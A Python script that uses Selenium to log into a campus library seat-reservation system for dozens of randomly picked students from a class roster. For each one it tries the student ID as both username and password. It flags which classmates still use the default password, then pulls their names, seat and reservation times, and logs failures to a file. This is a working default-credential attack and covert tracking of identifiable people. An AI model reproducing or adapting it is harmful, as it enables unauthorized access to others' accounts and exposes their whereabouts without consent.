# -*- coding:utf-8 -*-
from selenium import webdriver
import requests
from Mail.mail import sendmail
import pandas as pd
from Office.get_random_list import get_random
import time


def getcookies(sid):
    url = 'http://10.12.162.31/ClientWeb/m/ic2/Default.aspx'
    # options = Options()
    # options.add_argument('-headless')
    #driver = webdriver.Firefox(firefox_options=options)
    driver = webdriver.Chrome()
    driver.get(url)
    driver.find_element_by_xpath('//*[@id="username"]').clear()
    driver.find_element_by_xpath('//*[@id="username"]').send_keys(sid)
    driver.find_element_by_xpath('//*[@id="password"]').clear()
    driver.find_element_by_xpath('//*[@id="password"]').send_keys(sid)
    driver.find_element_by_xpath('//*[@id="aspnetForm"]/div[6]/p[1]/a').click()
    cookies = driver.get_cookie('ASP.NET_SessionId')
    time.sleep(3)
    driver.quit()
    return cookies


def getdata(cookies):
    urlh = 'http://10.12.162.31/ClientWeb/m/a/resvlist.aspx?_t=1538234803278'
    headers ={'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Connection	':'keep-alive',
    'Host':'10.12.162.31',
    'Referer':'http://10.12.162.31/ClientWeb/m/ic2/Default.aspx',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; …) Gecko/20100101 Firefox/62.0',
    'X-Requested-With':'XMLHttpRequest'}
    data = requests.get(urlh,headers = headers)
    data.encoding =data.apparent_encoding
    return data.text

def getdesk(cookies):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; …) Gecko/20100101 Firefox/62.0'}
    urld = 'http://10.12.162.31/ClientWeb/pro/ajax/reserve.aspx?stat_flag=9&act=get_my_resv&_nocache=1538233635391'
    try:
        data = requests.get(urld, cookies=cookies, headers=headers,timeout=5)
        data.encoding = data.apparent_encoding
        return data.json()
    except Exception as e:
        pass

def getid(name):
    dict ={}
    data = pd.read_excel(r'C:\Users\Administrator\Desktop\学委\test.xlsx')
    xs = data.set_index("学号").to_dict()['姓名']
    return xs[name]

def get_detail(datas):
    data = datas[0]
    owner = data['owner']
    start = data['start']
    end = data['end']
    state = data['state'].strip("<span style='color:green' class='uni_trans'>").strip('</span>')
    desk = data['devName']
    content = [owner,desk,state,start,end]
    return content

def write_errorlist(code):
    with open('error_password.txt','a+') as f:
        content =  str(code) +'\n'
        f.write(content)

errorlist = [int(i.strip('\n')) for i in open('error_password.txt').readlines()]
data = pd.read_excel(r'C:\Users\Administrator\Desktop\学委\test.xlsx')
xs = data['学号'].values
namelist = [i for i in get_random(xs,60) if i not in errorlist]

for n in namelist:
    cookiess = {}
    sid = int(n)
    cookiess['ASP.NET_SessionId'] = getcookies(sid)['value']
    datas = getdesk(cookiess)
    print(datas)
    try:
        msg = datas['msg']
        if 'ok' in msg:
            info = datas['data']
            if len(str(info))<10:
                print(n,getid(n),'right password','not in library')
            else:
                detail = get_detail(info)
                print(n,getid(n),'right password','in library',detail)

        else:
            write_errorlist(n)
            print(n,getid(n),"error password")
    except:
        print(n)

